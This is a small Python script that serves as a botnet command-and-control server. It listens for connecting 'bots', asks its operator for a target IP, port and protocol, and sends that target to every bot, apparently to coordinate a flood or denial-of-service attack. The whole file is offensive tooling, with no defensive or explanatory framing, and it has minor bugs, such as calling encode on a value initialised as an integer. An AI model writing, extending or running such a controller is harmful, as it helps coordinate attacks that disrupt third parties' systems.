import socket
import threading

IP = ""
PORT = 10242
ADDR = (IP, PORT)
SIZE = 1024
FORMAT = "utf-8"
hostname = str("")
hostport = int(0)
proto = str("")
x = True

def on_new_bot(c,addr):
    global SIZE, FORMAT, hostname, hostport, proto
    while True:
        print(addr, "Bot Connected!")
        c.send(hostname.encode(FORMAT))
        print(addr, "Bot Got Hostname/IP")
        c.send(hostport.encode(FORMAT))
        print(addr, "Bot Got Port")
        c.send(proto.encode(FORMAT))
        print(addr, "Bot Got Protocol")
        break

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('Socket succesfully created')
s.bind((IP, PORT))
print(f'socket binded to port: {PORT}')
s.listen()
print(f"[LISTENING] Server is listening on {ADDR}")
while True:
    if x == True:
        hostname = input("IP:")
        hostport = input("Port:")
        proto = input("Protocol:")
        x = False
    c, addr = s.accept()
    thread = threading.Thread(target=on_new_bot, args=(c, addr))
    thread.start()
    print(f"[ACTIVE CONNECTIONS] {threading.activeCount() - 1}")

s.close()
